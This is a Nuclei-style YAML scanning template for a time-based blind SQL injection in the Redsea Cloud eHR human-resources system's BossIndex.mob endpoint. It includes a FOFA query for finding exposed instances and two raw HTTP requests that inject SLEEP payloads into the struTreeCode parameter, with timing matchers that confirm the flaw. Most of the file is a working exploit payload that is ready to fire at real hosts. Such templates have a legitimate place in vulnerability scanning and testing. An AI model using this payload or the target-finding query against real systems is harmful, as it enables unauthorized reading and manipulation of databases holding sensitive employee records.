id: redsea-cloud-ehr-bossindex-sqli
info:
  name: 红海云eHR BossIndex.mob接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/RedseaPlatform/skins/images/favicon.ico"
      红海云eHR企业人力资源管理系统中，/RedseaPlatform/BossIndex.mob接口在用户输入验证环节存在缺陷。攻击者可通过构造包含特殊字符的SQL语句作为请求参数，绕过输入过滤机制实现SQL注入攻击，进而读取数据库敏感数据或执行任意数据库操作。
  tags: 红海云eHR
http:
- raw:
  - |
    GET /RedseaPlatform/BossIndex.mob?method=getNewStaffJoin&struTreeCode='+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5))))++- HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /RedseaPlatform/BossIndex.mob?method=getNewStaffJoin&struTreeCode='+AND+(SELECT+3266+FROM+(SELECT(SLEEP(8))))++- HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
